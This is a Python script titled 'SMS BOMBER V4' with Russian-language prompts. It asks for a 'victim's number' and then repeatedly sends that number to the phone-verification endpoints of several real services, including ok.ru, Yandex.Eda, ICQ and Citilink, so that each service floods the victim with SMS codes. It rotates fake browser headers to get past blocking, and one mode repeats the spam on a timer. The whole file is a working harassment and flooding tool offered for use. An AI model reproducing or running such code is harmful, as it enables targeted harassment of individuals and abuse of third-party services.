banner = '''
SMS BOMBER V4
Written by DANIL COCOS
(This is remake of SMS BOMBER V2 BY DANIL COCOS)
'''
import sys
try:
    import random, datetime, argparse, os
    from time import sleep
except ImportError:
    print('CRITICAL ERROR! MAKE SURE THAT YOU HAVE INSTALLED PYTHON 3.x')
    sys.exit(1)
try:
    import requests
except ImportError:
    print('CRITICAL ERROR! MAKE SURE THAT YOU HAVE INSTALLED ALL LIBRARIES!')
    print('Enter "pip install requests" to fix this error')
    sys.exit(1)

heads = [
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]

def Logo():
    global phone
    global name
    global iteration
    print(banner)
    iteration = 0
    name = ''
    phone = input('Номер жертвы: ')
    mode = int(input('Режим: '))
    if mode == 0:
        bombing()
        print('На этом всё.')
    elif mode == 1:
        count = int(input('Кол-во циклов: '))
        for i in range(count):
            bombing()
            iteration += 1
            print(iteration, ' круг пройден. ')
        print('Спам окончен.')
        print('Нажмите "Enter", чтобы выйти...')
    elif mode == 2:
        print('Это новый режим! Он лучше всех других!')
        print('Хотя я хз зачем это пишу, так как это НЕ ПУБЛИЧНЫЙ БОМБЕР')
        count = int(input('Кол-во циклов: '))
        for i in range(count):
            bombing()
            iteration += 1
            print(iteration, ' круг пройден. ')
            print('Ждите 60 секунд, после чего снова будет спам. ')
            print('Так эффективнее.')
            sleep(60.5)
        print('Спам окончен.')
        print('Нажмите "Enter", чтобы выйти...')

def bombing():
    HEADERS = random.choice(heads)
    global phone
    global name
    global iteration
    if phone[0] == '+':
        phone = phone[1:]
    elif phone[0] == '8':
        phone = '7' + phone[1:]
    elif phone[0] == '9':
        phone = '7' + phone
    for x in range(12):
        name = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    phone9 = phone[1:]
    phone_plus = '+' + phone
    phone8 = '8' + phone[1:]
    email = name+f'{iteration}'+'@gmail.com'
    email = name+f'{iteration}'+'@gmail.com'
    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": phone_plus}, headers=HEADERS)
        print('Одноклассники: отправлено')
    except:
        print('Одноклассники: не отправлено')

    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + phone}, headers=HEADERS)
        print('Яндекс.Еда: не отправлено')
    except:
        print('Яндекс.Еда: не отправлено')

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
        print('ICQ: отправлено')
    except:
        print('ICQ: не отправлено')

    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/')
        print('Citilink: отправлено')
    except:
        print('CitiLink: не отправлено')
Logo()
    
